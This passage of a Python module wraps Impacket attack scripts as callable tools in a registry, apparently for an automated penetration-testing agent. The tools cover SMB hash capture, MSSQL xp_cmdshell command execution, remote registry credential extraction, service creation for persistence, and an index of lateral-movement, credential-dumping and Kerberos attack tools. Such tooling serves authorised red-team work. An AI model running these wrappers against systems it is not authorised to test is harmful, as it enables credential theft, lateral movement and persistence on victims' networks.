        result["summary"] = f"发现 {len(result['users'])} 个用户/组"
        return result


class SmbserverTool(ImpacketTool):
    """smbserver.py - SMB服务器"""

    def __init__(self):
        super().__init__("smbserver")

    def name(self) -> str:
        return "smbserver"

    def description(self) -> str:
        return "Impacket smbserver - 创建临时SMB服务器，用于文件传输"

    def supported_vulns(self) -> list:
        return ["SMB Server", "File Transfer", "Credential Capture"]

    def capability_statement(self) -> str:
        return "SMB服务器工具。适合：创建临时SMB共享用于文件传输，或捕获NTLM哈希。"

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "share_name": {"type": "str", "description": "共享名", "required": True},
            "share_path": {"type": "str", "description": "共享目录路径", "required": True},
            "username": {"type": "str", "description": "认证用户名", "required": False},
            "password": {"type": "str", "description": "认证密码", "required": False},
            "smb2": {"type": "bool", "description": "启用SMB2", "required": False, "default": True},
            "port": {"type": "int", "description": "监听端口", "required": False, "default": 445}
        }

    def execute(self, target: str, params: Dict) -> Dict:
        if not self.check_available():
            return {"error": "smbserver.py 未找到", "success": False}

        args = []
        share_name = params.get("share_name", "share")
        share_path = params.get("share_path", "/tmp/share")
        username = params.get("username", "")
        password = params.get("password", "")
        smb2 = params.get("smb2", True)
        port = params.get("port", 445)

        if smb2:
            args.append("-smb2support")

        if username and password:
            args.extend(["-username", username, "-password", password])

        args.append(share_name)
        args.append(share_path)

        # smbserver需要后台运行
        return {
            "success": True,
            "command": " ".join(self._build_cmd() + args),
            "notes": "此工具需要后台运行",
            "usage": f"后台执行: {' '.join(self._build_cmd() + args)} &"
        }


# ==================== MSSQL工具类 ====================

class MssqlclientTool(ImpacketTool):
    """mssqlclient.py - MSSQL客户端"""

    def __init__(self):
        super().__init__("mssqlclient")

    def name(self) -> str:
        return "mssqlclient"

    def description(self) -> str:
        return "Impacket mssqlclient - MSSQL数据库客户端"

    def supported_vulns(self) -> list:
        return ["MSSQL Access", "SQL Injection", "xp_cmdshell"]

    def capability_statement(self) -> str:
        return "MSSQL客户端工具。适合：连接MSSQL数据库、执行SQL命令、启用xp_cmdshell执行系统命令。"

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "target": {"type": "str", "description": "目标IP", "required": True},
            "username": {"type": "str", "description": "用户名", "required": True},
            "password": {"type": "str", "description": "密码", "required": False},
            "hash": {"type": "str", "description": "NTLM哈希", "required": False},
            "domain": {"type": "str", "description": "域名", "required": False},
            "port": {"type": "int", "description": "端口", "required": False, "default": 1433},
            "database": {"type": "str", "description": "数据库", "required": False, "default": "master"},
            "windows_auth": {"type": "bool", "description": "Windows认证", "required": False, "default": True}
        }

    def execute(self, target: str, params: Dict) -> Dict:
        if not self.check_available():
            return {"error": "mssqlclient.py 未找到", "success": False}

        args = []
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hash_val = params.get("hash", "")
        port = params.get("port", 1433)
        windows_auth = params.get("windows_auth", True)

        if windows_auth:
            args.append("-windows-auth")

        if hash_val:
            args.extend(["-hashes", hash_val])

        args.extend(["-port", str(port)])

        auth = f"{domain}/{username}" if domain else username
        if password:
            auth += f":{password}"

        args.append(f"{auth}@{target}")

        # mssqlclient是交互式工具
        return {
            "success": True,
            "command": " ".join(self._build_cmd() + args),
            "notes": "这是交互式工具，连接后可执行SQL命令",
            "usage": f"连接后执行: enable_xp_cmdshell; xp_cmdshell whoami",
            "interactive": True
        }


class MssqlinstanceTool(ImpacketTool):
    """mssqlinstance.py - MSSQL实例枚举"""

    def __init__(self):
        super().__init__("mssqlinstance")

    def name(self) -> str:
        return "mssqlinstance"

    def description(self) -> str:
        return "Impacket mssqlinstance - 枚举MSSQL实例信息"

    def supported_vulns(self) -> list:
        return ["MSSQL Enumeration", "Service Discovery"]

    def capability_statement(self) -> str:
        return "MSSQL实例枚举工具。适合：发现网络中的MSSQL实例和版本信息。"

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "target": {"type": "str", "description": "目标IP或网段", "required": True}
        }

    def execute(self, target: str, params: Dict) -> Dict:
        if not self.check_available():
            return {"error": "mssqlinstance.py 未找到", "success": False}

        args = ["-target", target]
        return self._run_cmd(args)


# ==================== RPC工具类 ====================

class RpcdumpTool(ImpacketTool):
    """rpcdump.py - RPC端点枚举"""

    def __init__(self):
        super().__init__("rpcdump")

    def name(self) -> str:
        return "rpcdump"

    def description(self) -> str:
        return "Impacket rpcdump - 枚举RPC端点"

    def supported_vulns(self) -> list:
        return ["RPC Enumeration", "Service Discovery"]

    def capability_statement(self) -> str:
        return "RPC枚举工具。适合：发现目标上可用的RPC接口，寻找潜在攻击面。"

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "target": {"type": "str", "description": "目标IP", "required": True},
            "username": {"type": "str", "description": "用户名", "required": False},
            "password": {"type": "str", "description": "密码", "required": False},
            "hash": {"type": "str", "description": "NTLM哈希", "required": False},
            "domain": {"type": "str", "description": "域名", "required": False}
        }

    def execute(self, target: str, params: Dict) -> Dict:
        if not self.check_available():
            return {"error": "rpcdump.py 未找到", "success": False}

        args = []
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hash_val = params.get("hash", "")

        if username:
            auth = f"{domain}/{username}" if domain else username
            if hash_val:
                args.extend(["-hashes", hash_val])
            elif password:
                auth += f":{password}"
            args.append(auth)

        args.append(f"@{target}")

        return self._run_cmd(args)


class SamrdumpTool(ImpacketTool):
    """samrdump.py - SAMR枚举"""

    def __init__(self):
        super().__init__("samrdump")

    def name(self) -> str:
        return "samrdump"

    def description(self) -> str:
        return "Impacket samrdump - 通过SAMR协议枚举用户、组、共享"

    def supported_vulns(self) -> list:
        return ["SAMR Enumeration", "User Enumeration", "Share Enumeration"]

    def capability_statement(self) -> str:
        return "SAMR枚举工具。适合：通过SAMR协议获取用户列表、组信息、共享列表等。"

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "target": {"type": "str", "description": "目标IP", "required": True},
            "username": {"type": "str", "description": "用户名", "required": False},
            "password": {"type": "str", "description": "密码", "required": False},
            "hash": {"type": "str", "description": "NTLM哈希", "required": False},
            "domain": {"type": "str", "description": "域名", "required": False}
        }

    def execute(self, target: str, params: Dict) -> Dict:
        if not self.check_available():
            return {"error": "samrdump.py 未找到", "success": False}

        args = []
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hash_val = params.get("hash", "")

        if username:
            auth = f"{domain}/{username}" if domain else username
            if hash_val:
                args.extend(["-hashes", hash_val])
            elif password:
                auth += f":{password}"
            args.append(auth)

        args.append(f"@{target}")

        return self._run_cmd(args)


# ==================== 其他实用工具 ====================

class RegTool(ImpacketTool):
    """reg.py - 注册表操作"""

    def __init__(self):
        super().__init__("reg")

    def name(self) -> str:
        return "reg"

    def description(self) -> str:
        return "Impacket reg - 远程注册表操作"

    def supported_vulns(self) -> list:
        return ["Registry Access", "Credential Extraction", "Persistence"]

    def capability_statement(self) -> str:
        return "注册表操作工具。适合：读取远程注册表、提取自动登录凭据、发现启动项等。"

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "target": {"type": "str", "description": "目标IP", "required": True},
            "username": {"type": "str", "description": "用户名", "required": True},
            "password": {"type": "str", "description": "密码", "required": False},
            "hash": {"type": "str", "description": "NTLM哈希", "required": False},
            "domain": {"type": "str", "description": "域名", "required": False},
            "action": {"type": "str", "description": "操作: query,add,delete", "required": True},
            "key": {"type": "str", "description": "注册表键", "required": True},
            "value": {"type": "str", "description": "值名称", "required": False}
        }

    def execute(self, target: str, params: Dict) -> Dict:
        if not self.check_available():
            return {"error": "reg.py 未找到", "success": False}

        args = []
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hash_val = params.get("hash", "")
        action = params.get("action", "query")
        key = params.get("key", "")
        value = params.get("value", "")

        if hash_val:
            args.extend(["-hashes", hash_val])

        auth = f"{domain}/{username}" if domain else username
        if password:
            auth += f":{password}"

        args.append(auth)
        args.append(f"@{target}")
        args.append(action)
        args.append(key)

        if value:
            args.append("-v")
            args.append(value)

        return self._run_cmd(args)


class ServicesTool(ImpacketTool):
    """services.py - 服务管理"""

    def __init__(self):
        super().__init__("services")

    def name(self) -> str:
        return "services"

    def description(self) -> str:
        return "Impacket services - 远程Windows服务管理"

    def supported_vulns(self) -> list:
        return ["Service Management", "Persistence", "Privilege Escalation"]

    def capability_statement(self) -> str:
        return "服务管理工具。适合：枚举服务、创建/删除服务、修改服务配置实现持久化。"

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "target": {"type": "str", "description": "目标IP", "required": True},
            "username": {"type": "str", "description": "用户名", "required": True},
            "password": {"type": "str", "description": "密码", "required": False},
            "hash": {"type": "str", "description": "NTLM哈希", "required": False},
            "domain": {"type": "str", "description": "域名", "required": False},
            "action": {"type": "str", "description": "操作: list,start,stop,create,delete,config", "required": True},
            "name": {"type": "str", "description": "服务名", "required": False},
            "display": {"type": "str", "description": "显示名称", "required": False},
            "binary": {"type": "str", "description": "可执行路径", "required": False}
        }

    def execute(self, target: str, params: Dict) -> Dict:
        if not self.check_available():
            return {"error": "services.py 未找到", "success": False}

        args = []
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hash_val = params.get("hash", "")
        action = params.get("action", "list")
        name = params.get("name", "")
        display = params.get("display", "")
        binary = params.get("binary", "")

        if hash_val:
            args.extend(["-hashes", hash_val])

        auth = f"{domain}/{username}" if domain else username
        if password:
            auth += f":{password}"

        args.append(auth)
        args.append(f"@{target}")
        args.append(action)

        if name:
            args.append("-name")
            args.append(name)

        if action == "create" and display and binary:
            args.extend(["-display", display, "-path", binary])

        return self._run_cmd(args)


class GetArchTool(ImpacketTool):
    """getArch.py - 架构检测"""

    def __init__(self):
        super().__init__("getArch")

    def name(self) -> str:
        return "getarch"

    def description(self) -> str:
        return "Impacket getArch - 检测目标系统架构(x86/x64)"

    def supported_vulns(self) -> list:
        return ["Architecture Detection", "Reconnaissance"]

    def capability_statement(self) -> str:
        return "架构检测工具。适合：确定目标系统是32位还是64位，为后续攻击选择正确的payload。"

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "target": {"type": "str", "description": "目标IP", "required": True}
        }

    def execute(self, target: str, params: Dict) -> Dict:
        if not self.check_available():
            return {"error": "getArch.py 未找到", "success": False}

        args = ["-target", target]
        return self._run_cmd(args)


# ==================== 注册函数 ====================

def register():
    """注册所有Impacket工具"""
    from tool_framework import ToolRegistry

    # 远程执行类
    ToolRegistry.register(PsexecTool())
    ToolRegistry.register(WmiexecTool())
    ToolRegistry.register(SmbexecTool())
    ToolRegistry.register(AtexecTool())
    ToolRegistry.register(DcomexecTool())

    # 凭据导出类
    ToolRegistry.register(SecretsDumpTool())

    # Kerberos攻击类
    ToolRegistry.register(GetNPUsersTool())
    ToolRegistry.register(GetUserSPNsTool())
    ToolRegistry.register(TicketerTool())
    ToolRegistry.register(GoldenPacTool())

    # NTLM中继类
    ToolRegistry.register(NtlmrelayxTool())

    # AD域渗透类
    ToolRegistry.register(DacleditTool())
    ToolRegistry.register(GetADUsersTool())
    ToolRegistry.register(RaiseChildTool())

    # SMB工具类
    ToolRegistry.register(SmbclientTool())
    ToolRegistry.register(LookupsidTool())
    ToolRegistry.register(SmbserverTool())

    # MSSQL工具类
    ToolRegistry.register(MssqlclientTool())
    ToolRegistry.register(MssqlinstanceTool())

    # RPC工具类
    ToolRegistry.register(RpcdumpTool())
    ToolRegistry.register(SamrdumpTool())

    # 其他工具
    ToolRegistry.register(RegTool())
    ToolRegistry.register(ServicesTool())
    ToolRegistry.register(GetArchTool())


# ==================== 工具分类索引 ====================

TOOL_CATEGORIES = {
    "remote_execution": {
        "description": "远程执行工具",
        "tools": ["psexec", "wmiexec", "smbexec", "atexec", "dcomexec"],
        "usage": "需要管理员凭据，用于横向移动"
    },
    "credential_dumping": {
        "description": "凭据导出工具",
        "tools": ["secretsdump"],
        "usage": "导出SAM/NTDS凭据"
    },
    "kerberos_attack": {
        "description": "Kerberos攻击工具",
        "tools": ["getnpusers", "getuserspns", "ticketer", "goldenpac"],
        "usage": "AS-REP Roasting, Kerberoasting, 黄金票据"
    },
    "ntlm_relay": {
        "description": "NTLM中继攻击工具",
        "tools": ["ntlmrelayx"],
        "usage": "NTLM/SMB/LDAP中继攻击"
    },
    "ad_attack": {
        "description": "AD域渗透工具",
        "tools": ["dacledit", "getadusers", "raisechild"],
        "usage": "ACL滥用、域用户枚举、子域提权"
    },
    "smb_tools": {
        "description": "SMB工具",
        "tools": ["smbclient", "lookupsid", "smbserver"],
        "usage": "SMB共享访问、SID枚举、SMB服务器"
    },
    "mssql_tools": {
        "description": "MSSQL工具",
        "tools": ["mssqlclient", "mssqlinstance"],
        "usage": "MSSQL连接、实例枚举"
    },
    "rpc_tools": {
        "description": "RPC工具",
        "tools": ["rpcdump", "samrdump"],
        "usage": "RPC端点枚举、SAMR枚举"
    },
    "other_tools": {
        "description": "其他实用工具",
        "tools": ["reg", "services", "getarch"],
        "usage": "注册表操作、服务管理、架构检测"
    }
}


def get_tools_by_category(category: str) -> List[str]:
    """获取指定分类的工具列表"""
    return TOOL_CATEGORIES.get(category, {}).get("tools", [])


def get_all_tools() -> List[str]:
    """获取所有工具列表"""
    tools = []
    for cat in TOOL_CATEGORIES.values():
        tools.extend(cat.get("tools", []))
    return tools


def get_tool_usage(tool_name: str) -> str:
    """获取工具使用说明"""
    for cat, info in TOOL_CATEGORIES.items():
        if tool_name in info.get("tools", []):
            return f"[{info['description']}] {info['usage']}"
    return "未知工具"